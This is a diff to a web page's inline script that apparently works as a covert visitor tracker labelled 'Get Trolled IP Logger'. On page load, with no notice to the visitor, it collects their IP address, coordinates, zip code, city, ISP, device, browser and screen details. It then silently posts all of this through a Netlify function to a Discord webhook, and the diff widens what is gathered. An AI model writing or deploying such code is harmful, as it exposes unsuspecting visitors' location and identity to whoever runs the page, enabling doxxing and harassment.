@@ -14,65 +14,139 @@
   </style>
 </head>
 <body>
-  <script>
-    const netlifyFunctionUrl = "/.netlify/functions/log-ip";
+<script>
+  const netlifyFunctionUrl = "/.netlify/functions/log-ip";
 
-    function safeGet(obj, path, defaultValue = '') {
-      return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
+  function safeGet(obj, path, defaultValue = '') {
+    return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
+  }
+
+  // Simple UA parser for device info (phone model, OS, browser)
+  function parseUserAgent(ua) {
+    let device = "Unknown Device";
+    let os = "Unknown OS";
+    let browser = "Unknown Browser";
+
+    if (/Android/.test(ua)) {
+      os = "Android";
+      const match = ua.match(/Android.*;\s([^)]+)\)/);
+      if (match) device = match[1];
+    } else if (/iPhone/.test(ua)) {
+      os = "iOS (iPhone)";
+      device = "iPhone";
+    } else if (/iPad/.test(ua)) {
+      os = "iOS (iPad)";
+      device = "iPad";
+    } else if (/Windows NT/.test(ua)) {
+      os = "Windows";
+    } else if (/Mac OS X/.test(ua)) {
+      os = "Mac OS";
     }
 
-    async function fetchIPInfo() {
-      const res = await fetch('https://ipwhois.app/json/');
-      if (!res.ok) throw new Error('Failed to fetch IP info');
-      return res.json();
+    if (/Chrome\/\d+/.test(ua)) {
+      browser = "Chrome";
+    } else if (/Firefox\/\d+/.test(ua)) {
+      browser = "Firefox";
+    } else if (/Safari\/\d+/.test(ua) && !/Chrome/.test(ua)) {
+      browser = "Safari";
+    } else if (/Edg\/\d+/.test(ua)) {
+      browser = "Edge";
     }
 
-    async function sendDiscordWebhook(embed) {
-      await fetch(netlifyFunctionUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] }),
-      });
-    }
+    return { device, os, browser };
+  }
 
-    (async () => {
-      try {
-        const data = await fetchIPInfo();
+  async function fetchIPInfo() {
+    const res = await fetch('https://ipwhois.app/json/');
+    if (!res.ok) throw new Error('Failed to fetch IP info');
+    return res.json();
+  }
 
-        const embed = {
-          title: "🕵️ New Visitor Logged",
-          color: 0x00ffff,
-          timestamp: new Date().toISOString(),
-          footer: {
-            text: "Get Trolled IP Logger",
-            icon_url: "https://i.imgur.com/qZ7j0fV.png"
-          },
-          thumbnail: {
-            url: data.country_flag || ""
-          },
-          author: {
-            name: "Get Trolled IP Logger",
-            url: "https://discord.com",
-            icon_url: "https://i.imgur.com/qZ7j0fV.png"
-          },
-          fields: [
-            { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
-            { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
-            { name: "Region", value: `${data.region}`, inline: true },
-            { name: "City", value: `${data.city}`, inline: true },
-            { name: "ISP", value: `${data.isp}`, inline: false },
-            { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
-            { name: "VPN/Proxy Detected", value: safeGet(data, ['security', 'is_proxy'], false) ? "Yes" : "No", inline: true },
-            { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-            { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true }
-          ]
-        };
+  async function fetchWeather(lat, lon) {
+    if (!lat || !lon) return null;
+    const url = `https://wttr.in/${lat},${lon}?format=j1`;
+    const res = await fetch(url);
+    if (!res.ok) return null;
+    return res.json();
+  }
 
-        await sendDiscordWebhook(embed);
-      } catch (_) {
-        // Fail silently
+  async function sendDiscordWebhook(embed) {
+    await fetch(netlifyFunctionUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds: [embed] }),
+    });
+  }
+
+  (async () => {
+    try {
+      const data = await fetchIPInfo();
+      const weatherData = await fetchWeather(data.latitude, data.longitude);
+      const uaInfo = parseUserAgent(navigator.userAgent);
+
+      const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone });
+
+      // Parse wttr.in data safely
+      let weather = null;
+      if (weatherData && weatherData.current_condition && weatherData.current_condition.length > 0) {
+        weather = weatherData.current_condition[0];
       }
-    })();
-  </script>
+
+      const embed = {
+        title: "🕵️ New Visitor Logged",
+        color: 0x00ffff,
+        timestamp: new Date().toISOString(),
+        footer: {
+          text: "Get Trolled IP Logger",
+          icon_url: "https://i.imgur.com/qZ7j0fV.png"
+        },
+        thumbnail: {
+          url: data.country_flag || ""
+        },
+        author: {
+          name: "Get Trolled IP Logger",
+          url: "https://discord.com",
+          icon_url: "https://i.imgur.com/qZ7j0fV.png"
+        },
+        fields: [
+          { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
+          { name: "IPv6 Address", value: data.ipv6 ? `\`${data.ipv6}\`` : "N/A", inline: true },
+          { name: "Hostname", value: data.hostname || "N/A", inline: true },
+          { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
+          { name: "Region", value: data.region || "N/A", inline: true },
+          { name: "City", value: data.city || "N/A", inline: true },
+          { name: "Zip", value: data.postal || "N/A", inline: true },
+          { name: "Latitude", value: data.latitude || "N/A", inline: true },
+          { name: "Longitude", value: data.longitude || "N/A", inline: true },
+          { name: "ISP", value: data.isp || "N/A", inline: false },
+          { name: "Organization", value: data.org || "N/A", inline: false },
+          { name: "ASN", value: data.asn || "N/A", inline: true },
+          { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
+          { name: "Local Time", value: localTime, inline: true },
+          { name: "Currency", value: `${safeGet(data, ['currency', 'code'], 'N/A')} (${safeGet(data, ['currency', 'name'], '')})`, inline: true },
+          { name: "VPN/Proxy", value: safeGet(data, ['security', 'is_proxy'], false) ? "Yes" : "No", inline: true },
+          { name: "VPN/Hosting", value: safeGet(data, ['security', 'is_hosting'], false) ? "Yes" : "No", inline: true },
+          { name: "Mobile", value: safeGet(data, ['security', 'is_mobile'], false) ? "Yes" : "No", inline: true },
+          { name: "Bot", value: safeGet(data, ['security', 'is_bot'], false) ? "Yes" : "No", inline: true },
+          ...(weather ? [
+            { name: "Weather", value: `${weather.lang_en[0].value} - Feels like ${weather.FeelsLikeC}°C`, inline: true },
+            { name: "Temperature", value: `${weather.temp_C}°C`, inline: true },
+            { name: "Humidity", value: `${weather.humidity}%`, inline: true },
+            { name: "Wind Speed", value: `${weather.windspeedKmph} km/h`, inline: true },
+          ] : []),
+          { name: "Device Model", value: uaInfo.device, inline: true },
+          { name: "Operating System", value: uaInfo.os, inline: true },
+          { name: "Browser", value: uaInfo.browser, inline: true },
+          { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+          { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true },
+        ]
+      };
+
+      await sendDiscordWebhook(embed);
+    } catch (_) {
+      // Silent fail
+    }
+  })();
+</script>
 </body>
 </html>
